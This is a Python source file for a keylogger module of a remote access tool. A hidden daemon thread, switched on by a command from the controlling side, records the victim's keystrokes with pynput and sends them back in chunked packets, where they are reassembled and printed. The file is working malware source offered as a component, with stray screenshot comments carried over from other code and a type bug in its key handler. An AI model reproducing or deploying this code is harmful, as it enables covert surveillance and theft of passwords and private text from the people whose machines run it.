import threading
import queue
import struct
import time

from RATFunction.RATFunction import RATFunction, Side
from Constants import PACKET_SIZE

from pynput import keyboard


class MyLogging(RATFunction):
    # packet_id | size | is_last | buffer
    keystroke_chunk_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")

    set_state_packet_struct = struct.Struct(f"I I {PACKET_SIZE - 4 - 4}s")
    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        self.remote_logging_condition = threading.Condition()
        self.enabled = False



        if side == Side.REMOTE_SIDE:
            threading.Thread(target=self._keylogger_worker, daemon=True).start()

        self.keystroke_queue = queue.Queue()
        self.received_keystrokes_callback = lambda keystrokes: ()

    def handle_packet_admin_side(self, data):
        packet_id, size, last_flag, buffer = self.keystroke_chunk_packet_struct.unpack(data)
        self.keystroke_queue.put(buffer[:size])

        if last_flag:
            keystrokes = self.build_keystrokes()
            print("remote keystroke" + keystrokes)
            self.received_keystrokes_callback(keystrokes)

    def build_keystrokes(self):
        keystrokes = b''
        queue_size = self.keystroke_queue.qsize()
        for i in range(queue_size):
            keystrokes += self.keystroke_queue.get()

        return keystrokes.decode()

    def handle_packet_remote_side(self, data):
        packet_id, enabled, _ = self.set_state_packet_struct.unpack(data)
        if enabled != 0:
            self.enabled = True
            with self.remote_logging_condition:
                self.remote_logging_condition.notify()
        else:
            self.enabled = False
    def send_keystrokes(self, keystrokes: str):
        offset = 0
        max_chunk_size = PACKET_SIZE - 12
        while offset < len(keystrokes.encode()):
            chunk = keystrokes.encode()[offset:offset + max_chunk_size]
            is_last = 1 if len(chunk) < max_chunk_size else 0

            packet = self.keystroke_chunk_packet_struct.pack(self.identifier(), len(chunk), is_last, chunk)
            self.packet_queue.put(packet)

            offset += len(chunk)

    def identifier(self) -> int:
        return 3

    def send_set_state(self, state: bool):
        packet = self.set_state_packet_struct.pack(self.identifier(), 1 if state else 0, bytes())
        self.packet_queue.put(packet)

    def _on_press(self, key):
        try:
            print(key)
            self.send_keystrokes(key)
        except AttributeError:
            self.send_keystrokes(str(key))

    def _keylogger_worker(self):
        while True:
            while not self.enabled:
                with self.remote_logging_condition:
                    self.remote_logging_condition.wait()  # wait for the flag to be set to True

            # Capture screenshot image


            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()

            # Convert image to binary format



            time.sleep(0.1)

